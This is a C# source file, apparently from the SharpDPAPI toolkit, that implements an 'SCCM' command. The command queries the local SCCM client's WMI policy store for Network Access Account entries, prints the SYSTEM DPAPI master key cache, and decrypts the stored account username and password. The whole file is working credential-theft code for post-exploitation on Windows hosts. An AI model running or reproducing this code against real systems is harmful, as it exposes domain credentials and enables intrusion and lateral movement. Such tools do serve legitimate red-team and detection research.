﻿using System;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Management;

namespace SharpDPAPI.Commands
{
    public class SCCM : ICommand
    {
        public static string CommandName => "SCCM";

        public static ManagementScope NewSccmConnection(string path)
        {
            ConnectionOptions connection = new ConnectionOptions();
            ManagementScope sccmConnection = new ManagementScope(path, connection);
            try
            {
                Console.WriteLine($"[+] Connecting to {sccmConnection.Path}");
                sccmConnection.Connect();
            }
            catch (System.UnauthorizedAccessException unauthorizedErr)
            {
                Console.WriteLine("[!] Access to WMI was not authorized (user name or password might be incorrect): " + unauthorizedErr.Message);
                return null;
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error connecting to WMI: " + e.Message);
                return null;
            }
            return sccmConnection;
        }

        public static string[] GetKeyPropertyNames(ManagementScope sccmConnection, string className)
        {
            using (ManagementClass managementClass = new ManagementClass(sccmConnection, new ManagementPath(className), new ObjectGetOptions()))
            {
                return managementClass.Properties
                    .Cast<PropertyData>()
                    .Where(
                        property => property.Qualifiers
                            .Cast<QualifierData>()
                            .Any(qualifier => string.Equals(qualifier.Name, "Key", StringComparison.OrdinalIgnoreCase))
                    )
                    .Select(property => property.Name)
                    .ToArray();
            }
        }


        public static void GetClassInstances(ManagementScope scope, string wmiClass, bool count = false, string[] properties = null, string whereCondition = null, string orderByColumn = null, bool dryRun = false, bool verbose = false)
        {
            try
            {
                string query = "";
                string propString = "";
                string whereClause = "";
                string orderByClause = "";

                if (verbose || count || properties == null)
                {
                    propString = "*";
                }
                else
                {
                    string[] keyPropertyNames = GetKeyPropertyNames(scope, wmiClass);
                    properties = keyPropertyNames.Union(properties).ToArray();
                    propString = string.Join(",", properties);
                }
                if (!string.IsNullOrEmpty(whereCondition))
                {
                    whereClause = $"WHERE {whereCondition}";
                }
                if (!string.IsNullOrEmpty(orderByColumn))
                {
                    orderByClause = $"ORDER BY {orderByColumn}";
                }
                if (count)
                {
                    query = $"SELECT COUNT({propString}) FROM {wmiClass} {whereClause}";
                }
                else
                {
                    query = $"SELECT {propString} FROM {wmiClass} {whereClause} {orderByClause}";
                }

                if (dryRun)
                {
                    Console.WriteLine($"[+] WQL query: {query}");
                }
                else
                {
                    Console.WriteLine($"[+] Executing WQL query: {query}");
                    ObjectQuery objQuery = new ObjectQuery(query);
                    ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, objQuery);
                    Console.WriteLine("-----------------------------------");
                    Console.WriteLine(wmiClass);
                    Console.WriteLine("-----------------------------------");
                    foreach (ManagementObject queryObj in searcher.Get())
                    {
                        // Get lazy properties unless we're just counting instances
                        if (!count)
                        {
                            queryObj.Get();
                        }
                        foreach (PropertyData prop in queryObj.Properties)
                        {
                            // Print default properties if none specified, named properties if specified, or all properties if verbose
                            if (properties == null || properties.Length == 0 || properties.Contains(prop.Name) || count || verbose)
                            {
                                if (prop.IsArray)
                                {
                                    // Test to see if we can display property values as strings, otherwise bail. Byte[] (e.g., Device.ObjectGUID) breaks things, Object[] (e.g., Collection.CollectionRules, Collection.RefreshSchedule) breaks things
                                    if (prop.Value is String[])
                                    {
                                        String[] nestedValues = (String[])(prop.Value);
                                        Console.WriteLine($"{prop.Name}: {string.Join(", ", nestedValues)}");
                                    }
                                    else if (prop.Value is int[])
                                    {
                                        int[] nestedValues = (int[])(prop.Value);
                                        string[] nestedValueStrings = nestedValues.Select(x => x.ToString()).ToArray();
                                        Console.WriteLine($"{prop.Name}: {string.Join(", ", nestedValueStrings)}");
                                    }
                                    else
                                    {
                                        string canConvertToString = prop.Value as string;
                                        if (canConvertToString != null)
                                        {
                                            Console.WriteLine($"{prop.Name}: {canConvertToString}");
                                        }
                                        else
                                        {
                                            Console.WriteLine($"{prop.Name}: Can't display {prop.Type.ToString()} as a String");
                                        }
                                    }
                                }
                                else
                                {
                                    Console.WriteLine("{0}: {1}", prop.Name, prop.Value);
                                }
                            }
                        }
                        Console.WriteLine("-----------------------------------");
                    }
                }
            }
            catch (ManagementException err)
            {
                Console.WriteLine("An error occurred while querying for WMI data: " + err.Message);
            }
        }

        public static void NAADecrypt(string blob, Dictionary<string, string> masterkeys)
        {
            byte[] blobBytes = new byte[blob.Length / 2];
            for (int i = 0; i < blob.Length; i += 2)
            {
                blobBytes[i / 2] = Byte.Parse(blob.Substring(i, 2), System.Globalization.NumberStyles.HexNumber);
            }

            var offset = 4;
            byte[] unmangedArray = new byte[blob.Length / 2];
            Buffer.BlockCopy(blobBytes, 4, unmangedArray, 0, blobBytes.Length - offset);

            blobBytes = unmangedArray;

            if (blobBytes.Length > 0)
            {
                byte[] decBytesRaw = Dpapi.DescribeDPAPIBlob(blobBytes, masterkeys, "blob");

                if ((decBytesRaw != null) && (decBytesRaw.Length != 0))
                {
                    if (Helpers.IsUnicode(decBytesRaw))
                    {
                        string data = "";
                        int finalIndex = Array.LastIndexOf(decBytesRaw, (byte)0);
                        if (finalIndex > 1)
                        {
                            byte[] decBytes = new byte[finalIndex + 1];
                            Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
                            data = Encoding.Unicode.GetString(decBytes);
                        }
                        else
                        {
                            data = Encoding.ASCII.GetString(decBytesRaw);
                        }
                        Console.WriteLine("    dec(blob)        : {0}", data);
                    }
                    else
                    {
                        string hexData = BitConverter.ToString(decBytesRaw).Replace("-", " ");
                        Console.WriteLine("    dec(blob)        : {0}", hexData);
                    }
                }
            }
        }

        public static void LocalNetworkAccessAccountsWmi()
        {
            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("[X] Must be elevated to triage SYSTEM DPAPI Credentials!");
            }
            else
            {
                ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm\\policy\\Machine\\ActualConfig");
                if (sccmConnection != null)
                {
                    GetClassInstances(sccmConnection, "CCM_NetworkAccessAccount");
                    ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
                    ManagementObjectCollection accounts = searcher.Get();
                    if (accounts.Count > 0)
                    {
                        foreach (ManagementObject account in accounts)
                        {
                            string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                            string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
                            byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                            int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                            Array.Resize(ref protectedUsernameBytes, length);

                            Dictionary<string, string> mappings = Triage.TriageSystemMasterKeys();

                            Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
                            foreach (KeyValuePair<string, string> kvp in mappings)
                            {
                                Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                            }
                            Console.WriteLine();

                            try
                            {
                                NAADecrypt(protectedUsername, mappings);
                                NAADecrypt(protectedPassword, mappings);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                                Console.WriteLine(e.ToString());
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount");
                    }
                }
            }

        }

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Action: SCCM Triage");
            arguments.Remove("SCCM");

            LocalNetworkAccessAccountsWmi();
        }
    }
}